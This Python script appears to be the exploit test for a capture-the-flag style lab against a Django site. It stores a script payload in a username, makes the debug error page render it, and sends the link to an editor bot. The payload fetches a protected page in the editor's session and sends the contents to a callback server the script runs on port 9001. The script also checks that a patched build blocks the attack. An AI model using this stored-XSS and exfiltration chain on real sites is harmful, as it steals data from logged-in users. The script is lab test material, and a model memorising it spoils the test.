#!/usr/bin/env python3
"""External learner -> genuine Django error page -> admin browser -> Flag callback."""
import os
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TARGET = "http://target:8000"
EXPECTED = os.environ["EXPECTED_FLAG"]
MODE = os.environ.get("TEST_MODE", "vulnerable")
received = []
class Callback(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.parse_qs(urllib.parse.urlsplit(self.path).query)
        if query.get("f"):
            received.extend(query["f"])
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, fmt, *args):
        pass

httpd = HTTPServer(("0.0.0.0", 9001), Callback)
thread = threading.Thread(target=httpd.serve_forever, daemon=True)
thread.start()

def get(path, ok=(200,)):
    try:
        with urllib.request.urlopen(TARGET + path, timeout=12) as response:
            status, data = response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        status, data = err.code, err.read().decode("utf-8", "replace")
    assert status in ok, (path[:90], status)
    return data

assert "Harbor Registry" in get("/")
assert "Editorial submissions" in get("/editorial/")
assert "Forbidden" in get("/staff/flag", (403,))
print("PASS: normal learner cannot access protected editorial Flag", flush=True)

# This payload is executed only by Django's authentic vulnerable debug page.
# The external callback must originate from the authenticated editor browser.
js = "fetch('/staff/flag').then(r=>r.text()).then(f=>{(new Image).src='http://a:9001/?f='+encodeURIComponent(f)})"
handle = "<script>" + js + "</script>"
assert len(handle) <= 512
query = urllib.parse.urlencode({"username": handle})
path = "/create_user/?" + query
assert "Registration received" in get(path)
assert "IntegrityError" in get(path, (500,))
print("PASS: real PostgreSQL duplicate-key traceback", flush=True)
payload = urllib.parse.urlencode({"website": "http://editorial.invalid" + path}).encode()
req = urllib.request.Request(TARGET + "/editorial/", data=payload, method="POST")
with urllib.request.urlopen(req, timeout=12) as res:
    assert res.status == 200
    assert b"queued" in res.read()
print("PASS: normal site submission queued for editor Bot", flush=True)

deadline = time.monotonic() + (40 if MODE == "vulnerable" else 25)
while time.monotonic() < deadline and not received:
    time.sleep(0.3)

if MODE == "vulnerable":
    assert received, "no authenticated XSS callback received"
    assert EXPECTED.strip() in received, ("wrong callback", received)
    print("PASS: real editor browser XSS fetched protected per-instance Flag and sent callback", flush=True)
else:
    assert not received, ("patched Django unexpectedly executed XSS", received)
    print("PASS: patched error page prevented editor XSS callback", flush=True)
httpd.shutdown()
